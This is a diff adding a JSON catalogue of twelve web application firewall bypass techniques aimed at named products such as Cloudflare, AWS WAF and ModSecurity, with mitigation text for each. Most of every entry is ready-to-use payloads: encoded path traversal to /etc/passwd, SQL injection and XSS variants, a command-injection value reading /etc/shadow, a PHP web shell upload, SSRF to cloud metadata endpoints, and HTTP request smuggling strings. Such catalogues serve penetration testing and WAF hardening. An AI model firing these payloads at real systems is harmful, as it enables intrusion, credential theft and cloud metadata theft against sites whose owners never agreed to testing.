@@ -1,0 +1,194 @@
+[
+  {
+    "id": "WAF-001",
+    "name": "URL Double Encoding",
+    "category": "encoding",
+    "target_wafs": ["Cloudflare", "AWS WAF", "ModSecurity", "Imperva"],
+    "description": "Bypass WAF rules by double-encoding URL characters. The WAF decodes once but the backend application decodes twice, allowing the payload to slip through undetected.",
+    "payloads": [
+      "%252F%252E%252E%252Fetc%252Fpasswd",
+      "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "%2527%2520OR%25201%253D1--",
+      "%25252e%25252e%25252f%25252e%25252e%25252fetc%25252fpasswd",
+      "/%25c0%25ae%25c0%25ae/etc/passwd"
+    ],
+    "detection_evasion": "WAF applies single-pass URL decoding; the second encoding layer remains intact until the application server processes the request, bypassing pattern matching on decoded values.",
+    "mitigation": "Configure WAF to perform recursive/multi-pass URL decoding before rule evaluation. Implement canonicalization at the application layer and reject requests containing double-encoded sequences."
+  },
+  {
+    "id": "WAF-002",
+    "name": "Unicode Normalization Bypass",
+    "category": "encoding",
+    "target_wafs": ["Cloudflare", "AWS WAF", "Akamai", "F5 BIG-IP"],
+    "description": "Exploit differences in Unicode normalization (NFC, NFD, NFKC, NFKD) between the WAF and backend to smuggle payloads through using homoglyphs or decomposed characters.",
+    "payloads": [
+      "<scrip\\u0074>alert(1)</scrip\\u0074>",
+      "\\uff1cscript\\uff1ealert(1)\\uff1c/script\\uff1e",
+      "SE\\u004cECT * FR\\u004fM users",
+      "\\u0027 OR 1=1--",
+      "<img src=x on\\u0065rror=alert(1)>"
+    ],
+    "detection_evasion": "WAF signature matching operates on raw bytes while the application normalizes Unicode codepoints to their ASCII equivalents before execution, allowing fullwidth or decomposed characters to evade detection.",
+    "mitigation": "Normalize all Unicode input to NFKC form at the WAF layer before applying rules. Block requests containing overlong UTF-8 sequences and unexpected Unicode categories in parameter values."
+  },
+  {
+    "id": "WAF-003",
+    "name": "HTTP Parameter Pollution",
+    "category": "semantic",
+    "target_wafs": ["ModSecurity", "AWS WAF", "Cloudflare", "Sucuri"],
+    "description": "Submit the same parameter multiple times in a request. Different web servers handle duplicate parameters differently (first, last, concatenate), allowing an attacker to split a malicious payload across parameters.",
+    "payloads": [
+      "id=1&id=2 UNION SELECT 1,2,3--",
+      "search=harmless&search=<script>alert(1)</script>",
+      "q=SELECT&q= * FROM&q= users--",
+      "file=safe.txt&file=../../etc/passwd",
+      "cmd=ls&cmd=;cat /etc/shadow"
+    ],
+    "detection_evasion": "WAF inspects only the first or last occurrence of a parameter, while the backend framework concatenates or selects a different instance. The malicious payload exists in the parameter instance the WAF ignores.",
+    "mitigation": "Configure WAF to inspect all instances of repeated parameters. Normalize parameter handling to match the backend framework behavior. Reject requests with duplicate parameter names in strict mode."
+  },
+  {
+    "id": "WAF-004",
+    "name": "Chunked Transfer Encoding Abuse",
+    "category": "fragmentation",
+    "target_wafs": ["ModSecurity", "AWS WAF", "Imperva", "Barracuda"],
+    "description": "Fragment malicious payloads across multiple HTTP chunks using Transfer-Encoding: chunked. Many WAFs inspect each chunk individually rather than reassembling the full body before rule evaluation.",
+    "payloads": [
+      "POST with chunks: [3\\r\\nSEL\\r\\n][3\\r\\nECT\\r\\n][9\\r\\n * FROM \\r\\n][5\\r\\nusers\\r\\n]",
+      "Transfer-Encoding: chunked\\r\\n\\r\\n1\\r\\n'\\r\\n3\\r\\n OR\\r\\n5\\r\\n 1=1-\\r\\n1\\r\\n-\\r\\n0\\r\\n",
+      "Transfer-Encoding:\\x20chunked",
+      "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: identity",
+      "chunk-ext with payload: 5;malicious=true\\r\\nSELEC\\r\\n1\\r\\nT\\r\\n0\\r\\n"
+    ],
+    "detection_evasion": "WAF processes each chunk as an isolated fragment, failing to detect signatures that span chunk boundaries. Chunk extensions and trailer fields add additional complexity that WAFs often ignore.",
+    "mitigation": "Ensure WAF fully reassembles chunked requests before inspection. Set maximum chunk count and size limits. Strip or normalize Transfer-Encoding headers and reject requests with conflicting Content-Length and Transfer-Encoding."
+  },
+  {
+    "id": "WAF-005",
+    "name": "Case Variation and Mixed Case",
+    "category": "encoding",
+    "target_wafs": ["ModSecurity", "Sucuri", "Wordfence", "Basic WAFs"],
+    "description": "Exploit case-sensitive regex patterns in WAF rules by alternating character case in SQL keywords, HTML tags, and JavaScript functions.",
+    "payloads": [
+      "<ScRiPt>alert(1)</sCrIpT>",
+      "sElEcT * fRoM users WhErE 1=1",
+      "<iMg SrC=x oNeRrOr=alert(1)>",
+      "UnIoN SeLeCt NULL,NULL,vErSiOn()--",
+      "<SVG/ONLOAD=alert(String.fromCharCode(88,83,83))>"
+    ],
+    "detection_evasion": "WAF rules using case-sensitive patterns (e.g., matching 'SELECT' or 'script') miss variations where characters alternate between upper and lower case, while SQL and HTML parsers are case-insensitive.",
+    "mitigation": "Apply case-insensitive matching ((?i) flag) on all WAF rules. Convert request data to lowercase before rule evaluation. Use token-based parsing rather than regex pattern matching."
+  },
+  {
+    "id": "WAF-006",
+    "name": "SQL/XSS Comment Injection",
+    "category": "semantic",
+    "target_wafs": ["ModSecurity", "AWS WAF", "Cloudflare", "Imperva"],
+    "description": "Insert SQL inline comments or HTML comments within payloads to break up signatures that WAF rules look for while preserving execution semantics.",
+    "payloads": [
+      "SEL/*bypass*/ECT * FR/*bypass*/OM users",
+      "UN/**/ION/**/SEL/**/ECT/**/1,2,3",
+      "<scr<!--comment-->ipt>alert(1)</script>",
+      "1'/*!50000UNION*//*!50000SELECT*/1,2,3--",
+      "admin'--/**/ OR '1'='1"
+    ],
+    "detection_evasion": "Inline comments split SQL keywords and HTML tags into fragments that no longer match WAF signatures, but the database engine and browser strip comments during parsing and execute the reassembled payload.",
+    "mitigation": "Strip all SQL and HTML comments before rule evaluation. Use parser-aware inspection that understands comment syntax. Detect and block requests containing comment sequences within keyword boundaries."
+  },
+  {
+    "id": "WAF-007",
+    "name": "Null Byte Injection",
+    "category": "encoding",
+    "target_wafs": ["ModSecurity", "Imperva", "F5 BIG-IP", "Legacy WAFs"],
+    "description": "Insert null bytes (%00) to terminate string processing in the WAF while the backend language (PHP, Perl) or web server continues processing the full payload past the null.",
+    "payloads": [
+      "../../etc/passwd%00.jpg",
+      "admin%00'OR 1=1--",
+      "<script>alert(1)</script>%00",
+      "file.php%00.png",
+      "%00<script>alert(document.cookie)</script>"
+    ],
+    "detection_evasion": "C-based WAF engines treat null bytes as string terminators, stopping inspection at that point. Languages like PHP (pre-5.3.4) pass the truncated string to file operations, allowing path traversal with extension bypass.",
+    "mitigation": "Reject any request containing null bytes in parameters, headers, or URL paths. Use WAF engines that process the full byte sequence without null termination. Validate at the application level that no null bytes exist in file paths."
+  },
+  {
+    "id": "WAF-008",
+    "name": "Content-Type Switching",
+    "category": "protocol",
+    "target_wafs": ["AWS WAF", "Cloudflare", "Akamai", "ModSecurity"],
+    "description": "Change the Content-Type header to a type the WAF does not inspect (e.g., application/json instead of application/x-www-form-urlencoded) while the backend still parses the body correctly due to flexible parsers.",
+    "payloads": [
+      "Content-Type: application/json\\r\\n\\r\\n{\"param\":\"' OR 1=1--\"}",
+      "Content-Type: text/plain\\r\\n\\r\\nusername=admin&password=' OR '1'='1",
+      "Content-Type: application/xml\\r\\n\\r\\n<root><user>admin' UNION SELECT * FROM users--</user></root>",
+      "Content-Type: multipart/form-data; boundary=X\\r\\n--X\\r\\nContent-Disposition: form-data; name=\"q\"\\r\\n\\r\\n<script>alert(1)</script>\\r\\n--X--",
+      "Content-Type: application/x-amf\\r\\n\\r\\n[serialized payload with SQL injection]"
+    ],
+    "detection_evasion": "WAF rules are often bound to specific Content-Types. Switching to an unexpected type causes the WAF to skip body inspection entirely or apply wrong parsing logic, while the backend auto-detects and processes the content regardless.",
+    "mitigation": "Inspect request bodies regardless of Content-Type header. Validate that the Content-Type matches the actual body format. Restrict allowed Content-Types per endpoint and reject mismatches."
+  },
+  {
+    "id": "WAF-009",
+    "name": "Multipart Boundary Abuse",
+    "category": "protocol",
+    "target_wafs": ["ModSecurity", "AWS WAF", "Imperva", "Barracuda"],
+    "description": "Exploit parsing differences in multipart/form-data boundary handling between WAF and application. Use oversized boundaries, duplicate Content-Disposition headers, or nested multipart bodies.",
+    "payloads": [
+      "Content-Type: multipart/form-data; boundary=AAAA[4096 chars]\\r\\n--AAAA[...]\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"",
+      "multipart with duplicate Content-Disposition: form-data; name=\"safe\"\\r\\nContent-Disposition: form-data; name=\"cmd\"\\r\\n\\r\\nls -la",
+      "Content-Type: multipart/form-data; boundary=\"--=_Part_123\"; boundary=\"--=_Evil\"",
+      "multipart body with CRLF vs LF mismatch in boundary detection",
+      "--boundary\\r\\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php%00.jpg\"\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n<?php system($_GET['c']); ?>"
+    ],
+    "detection_evasion": "WAFs may fail to parse multipart bodies correctly when boundaries are extremely long, duplicated, or when header folding and encoding tricks are used. The application server uses a more permissive parser that processes the payload successfully.",
+    "mitigation": "Limit multipart boundary length. Use strict multipart parsing that rejects malformed boundaries. Inspect all parts of multipart bodies including filenames and content. Reject requests with duplicate or conflicting Content-Disposition headers."
+  },
+  {
+    "id": "WAF-010",
+    "name": "IP-Based Bypass via IPv6 and Decimal Notation",
+    "category": "protocol",
+    "target_wafs": ["Cloudflare", "AWS WAF", "ModSecurity", "Akamai"],
+    "description": "Bypass IP-based WAF rules and SSRF protections by representing internal/blocked IP addresses in alternative notations: IPv6 mapped addresses, decimal, octal, or hex representations.",
+    "payloads": [
+      "http://[::ffff:127.0.0.1]/admin",
+      "http://2130706433/admin",
+      "http://0x7f000001/sensitive",
+      "http://017700000001/internal",
+      "http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/"
+    ],
+    "detection_evasion": "WAF blocklists check for literal IP strings like '127.0.0.1' or '169.254.169.254' but fail to recognize equivalent representations in decimal (2130706433), octal (0177.0.0.1), hex (0x7f.0.0.1), or IPv6 mapped format.",
+    "mitigation": "Normalize all IP representations to canonical dotted-decimal format before evaluation. Block all RFC 1918, link-local, and loopback ranges regardless of notation. Parse and resolve hostnames before applying IP-based rules."
+  },
+  {
+    "id": "WAF-011",
+    "name": "Wildcard DNS and Rebinding for SSRF",
+    "category": "protocol",
+    "target_wafs": ["Cloudflare", "AWS WAF", "Application-layer WAFs"],
+    "description": "Use wildcard DNS services (e.g., nip.io, sslip.io) or DNS rebinding to point an attacker-controlled domain to internal IP addresses, bypassing hostname-based SSRF protections.",
+    "payloads": [
+      "http://127.0.0.1.nip.io/admin",
+      "http://169.254.169.254.sslip.io/latest/meta-data/",
+      "http://attacker-rebind.com (resolves to 169.254.169.254 on second lookup)",
+      "http://10.0.0.1.xip.io/internal-api",
+      "http://A.192.168.1.1.1time.10.0.0.1.1time.repeat.rebind.network/secret"
+    ],
+    "detection_evasion": "WAF validates the hostname string against blocklists but does not resolve DNS or check the IP after resolution. Wildcard DNS services return the embedded IP, and rebinding attacks change resolution between WAF check and application fetch.",
+    "mitigation": "Resolve DNS at the WAF layer and validate the resolved IP against blocklists. Pin DNS resolution to prevent TOCTOU rebinding. Block known wildcard DNS services. Implement network-level egress filtering to prevent internal network access from application servers."
+  },
+  {
+    "id": "WAF-012",
+    "name": "HTTP/2 Request Smuggling",
+    "category": "protocol",
+    "target_wafs": ["Cloudflare", "AWS ALB/WAF", "HAProxy", "Envoy"],
+    "description": "Exploit HTTP/2 downgrade vulnerabilities where a front-end speaks HTTP/2 but proxies to HTTP/1.1 backends. Inject smuggled requests via pseudo-headers, header injection, or CL/TE desync in the translation layer.",
+    "payloads": [
+      "H2 request with injected :path pseudo-header containing \\r\\n to split into two HTTP/1.1 requests",
+      "Transfer-Encoding header in HTTP/2 frame (prohibited but sometimes accepted by translators)",
+      ":method GET\\r\\n:path / HTTP/1.1\\r\\nHost: internal\\r\\n\\r\\nGET /admin",
+      "H2 CONTINUATION frame flood to bypass header size limits with smuggled headers",
+      "Content-Length: 0 in H2 with body containing smuggled HTTP/1.1 request"
+    ],
+    "detection_evasion": "HTTP/2 binary framing prevents classic CL/TE smuggling, but the HTTP/2-to-HTTP/1.1 translation at reverse proxies reintroduces desync opportunities. WAFs inspect the H2 stream but miss the smuggled request created during protocol downgrade.",
+    "mitigation": "Use end-to-end HTTP/2 without downgrading to HTTP/1.1. Validate that H2-to-H1 translation layers reject malformed pseudo-headers. Normalize all requests post-translation before WAF inspection. Deploy HTTP desync detection monitoring."
+  }
+]
